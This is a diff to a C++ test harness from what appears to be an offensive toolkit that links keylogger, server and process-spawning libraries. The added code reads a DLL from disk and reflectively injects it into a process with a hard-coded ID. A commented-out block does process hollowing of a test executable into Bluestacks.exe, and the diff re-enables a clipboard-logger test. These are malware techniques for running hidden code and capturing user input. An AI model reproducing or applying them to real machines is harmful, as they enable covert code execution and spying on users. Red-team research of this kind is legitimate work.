@@ -4,6 +4,8 @@
 */
 
 #include <iostream>
+#include <fstream>
+
 #include "../lib/localhost.h"
 #include "../lib/server.h"
 #include "../lib/keylogger.h"
@@ -191,6 +193,7 @@ void test_spawn()
 {
 	Spawn spawn = Spawn();
 
+	/*
 	// Spawn cmd.exe
 	bool success = spawn.start_exe("C:\\Windows\\System32\\cmd.exe", "/C ipconfig");
 	if (success)
@@ -212,7 +215,57 @@ void test_spawn()
 	{
 		printf("Failed to start msedge.exe: %d\n", GetLastError());
 	}
+	*/
 
+	// Spawn calc.exe in msedge.exe
+	int length;
+	char* buffer;
+	std::ifstream is;
+
+	/*
+	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\test_helloworld.exe", std::ios::binary);
+	// get length of file:
+	is.seekg(0, std::ios::end);
+	length = is.tellg();
+	is.seekg(0, std::ios::beg);
+	// allocate memory:
+	buffer = new char[length];
+	// read data as a block:
+	is.read(buffer, length);
+	is.close();
+
+
+	bool success = spawn.start_process_hollowing("C:\\Program Files\\BlueStacks\\Bluestacks.exe", buffer);
+	if (success)
+	{
+		printf("Successfully process hollowed test_helloworld.exe in Bluestacks.exe\n");
+	}
+	else
+	{
+		printf("Failed to process hollowed test_helloworld.exe in Bluestacks.exe: %d\n", GetLastError());
+	}
+	*/
+
+	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
+	// get length of file:
+	is.seekg(0, std::ios::end);
+	length = is.tellg();
+	is.seekg(0, std::ios::beg);
+	// allocate memory:
+	buffer = new char[length];
+	// read data as a block:
+	is.read(buffer, length);
+	is.close();
+
+	bool success = spawn.reflective_injection(33536, buffer, length);
+	if (success)
+	{
+		printf("Successfully injected into the process\n");
+	}
+	else
+	{
+		printf("Failed to inject in the process: %d\n", GetLastError());
+	}
 }
 
 int main()
@@ -231,6 +284,7 @@ int main()
 	printf("\n==========================================\n\n");
 
 	listProcesses();
+	*/
 
 	printf("\n==========================================\n\n");
 
@@ -239,13 +293,14 @@ int main()
 	printf("\n==========================================\n\n");
 
 	test_clipboard_logger();
-	*/
 
 	printf("\n==========================================\n\n");
 
+	/*
 	test_spawn();
 
 	Sleep(10 * 1000);
+	*/
 }
 
 int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance,
